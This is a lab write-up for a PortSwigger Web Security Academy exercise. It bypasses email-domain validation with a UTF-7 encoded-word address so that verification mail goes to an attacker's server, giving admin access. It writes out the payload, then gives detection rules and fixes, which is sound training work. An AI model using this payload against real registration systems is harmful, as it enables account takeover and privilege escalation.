# Lab 09 — Bypassing Access Controls Using Email Address Parsing Discrepancies

**Difficulty:** Expert  
**Category:** Business Logic Vulnerabilities  
**Platform:** PortSwigger Web Security Academy

---

## Goal
Register an account using bypassed email validation, gain admin access, and delete `carlos`.

---

## Steps

1. Open registration page — confirm only `@ginandjuice.shop` emails accepted
2. Test encoded-word parsing behavior on the email field
3. Craft UTF-7 encoded payload:
=?utf-7?q?attacker&AEA-exploit-XXXX.web-security-academy.net&ACA-?=@ginandjuice.shop
4. Register using this as the email address
5. Open exploit server inbox — verification email delivered there
6. Click verification link — account verified
7. Log in — Admin panel visible in navigation
8. Navigate to `/admin` → delete `carlos` → lab solved

**UTF-7 Decoding:**
&AEA- → @
&ACA- → space

Validator sees: `...@ginandjuice.shop` ✅ passes validation

Mail server decodes and delivers to: `attacker@exploit-server.net` ✅ attacker receives email

---

## What I Learned

This is a **Parser Differential attack** — two components handle the same input completely differently.

The validation layer reads the raw string → sees `@ginandjuice.shop` → allows registration.
The mail infrastructure decodes encoded-word syntax first → delivers to attacker's address.

Same input. Two interpretations. Access control bypassed.

This technique is based on real PortSwigger research — **"Splitting the Email Atom"** by Gareth Heyes. Parser confusion exists across many real-world contexts — email, URLs, HTTP request smuggling, JSON/XML, Unicode handling.

### 🔴 Attack
Craft a UTF-7 encoded email where the validator sees a trusted domain but the mail server decodes and delivers to an attacker-controlled address. Admin access achieved without ever owning a real `@ginandjuice.shop` email.

### 🔵 Blue Team Detection
- Alert on encoded-word syntax (`=?utf-7?`) appearing in registration email fields
- Log registrations where validation domain differs from actual SMTP delivery domain
- SIEM rule: flag admin panel access from accounts registered within the last 24 hours
- Monitor for new accounts with immediate privilege escalation

### 🛡️ Fix
- Decode and normalize email addresses BEFORE validation — always validate the decoded form
- Use a single email parsing library consistently across ALL components
- Reject any email input containing encoded-word syntax at the registration layer
- Validate email domain against actual SMTP delivery address, not raw string input
